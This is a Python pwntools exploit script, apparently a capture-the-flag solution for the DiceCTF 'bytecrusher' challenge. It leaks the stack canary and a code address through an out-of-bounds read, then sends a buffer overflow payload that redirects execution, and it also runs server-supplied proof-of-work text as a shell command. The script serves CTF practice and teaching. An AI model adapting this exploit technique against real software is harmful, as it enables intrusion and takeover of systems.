#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('bytecrusher_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x0000555555555360
        c
        ''')
        sleep(1)

# bytecrusher.chals.dicec.tf 1337
if args.REMOTE:
    p = remote("bytecrusher.chals.dicec.tf", 1337)
    # p = remote("0", 5000)
    p.recvuntil("proof of work:\n")
    data = p.recvline()[:-1]
    info(f'Data: {data}')
    import subprocess
    solution = subprocess.check_output(data, shell=True)[:-1]
    print(f'soluton: {solution}')
    sla(":", solution)
else:
    p = process([exe.path])
GDB()

def trial(str, rate, len):
    sla(b'nter a string to crush:\n', str)
    slna(b'Enter crush rate:\n', rate)
    slna(b'Enter output length:\n', len)

# 48
# canary: 73 --> 79
# input()
canary = b'\0'
for i in range(73, 80):
    trial(b'a', i, 3)
    p.recvuntil(b'Crushed string:\n')
    a = p.recv(1)
    canary += p.recv(1)
    print(canary)

canary = u64(canary)
info(f'canary: {hex(canary)}')


binary = b''
for i in range(88, 94):
    trial(b'a', i, 3)

    p.recvuntil(b'Crushed string:\n')
    a = p.recv(1)
    binary += p.recv(1)

binary = u64(binary.ljust(8, b'\0'))
exe.address = binary - 0x15ec
info(f'binary: {hex(binary)}')
info(f'binary base {hex(exe.address)}')
for i in range(3):
    trial(b'a', 3, 3)


load = flat(
    b'a'*0x18,
    canary,
    b'a'*8,
    binary - 0x343
)



sla(b'Enter some text:\n', load)

p.interactive()
